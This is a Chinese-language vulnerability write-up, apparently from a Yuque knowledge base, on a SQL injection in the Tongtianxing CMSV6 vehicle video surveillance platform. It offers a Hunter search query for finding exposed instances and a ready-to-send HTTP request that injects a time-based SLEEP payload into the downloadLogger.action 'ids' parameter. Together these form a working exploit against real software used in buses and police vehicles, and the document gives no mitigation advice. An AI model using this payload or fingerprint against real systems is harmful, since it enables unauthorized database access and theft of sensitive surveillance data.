# 通天星CMSV6车载视频监控平台 disable存在SQL注入漏洞

# 一、漏洞简介
通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星科技应用于公交车车载、校车车载、大巴车车载、物流车载、油品运输车载、警车车载等公共交通视频监控，还应用在家居看护、商铺远程监控、私家车的行驶分享仪上等。通天星CMSV6车载视频监控平台disable存在SQL注入漏洞，攻击者可以通过构造恶意的SQL语句，成功注入并执行恶意数据库操作，可能导致敏感信息泄露、数据库被篡改或其他严重后果。

# 二、影响版本
+ 通天星CMSV6车载视频监控平台

# 三、资产测绘
+ hunter`web.body="./open/webApi.html"`
+ 特征

![1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4.png](./img/SOwkwqowLJh9AbQ0/1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4-030024.png)

# 四、漏洞复现
```rust
GET /edu_security_officer/disable;downloadLogger.action?ids=1+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%285%29%29%29kOIi%29 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Connection: close
X-Forwarded-For: 127.0.0.1
Accept-Encoding: gzip, deflate
```

![1717265746631-43d0a11b-a656-4117-93fa-af88370c0cf8.png](./img/SOwkwqowLJh9AbQ0/1717265746631-43d0a11b-a656-4117-93fa-af88370c0cf8-182905.png)

```rust
GET /edu_security_officer/disable;downloadLogger.action?ids=1 HTTP/1.1
Host: 192.168.31.228
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Connection: close
X-Forwarded-For: 127.0.0.1
Accept-Encoding: gzip, deflate
```

![1717265761114-f1ef9a5c-996b-41d4-8ebf-4a5620210973.png](./img/SOwkwqowLJh9AbQ0/1717265761114-f1ef9a5c-996b-41d4-8ebf-4a5620210973-835467.png)



> 更新: 2024-12-28 13:05:34  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cmzasmro4p4gdshs>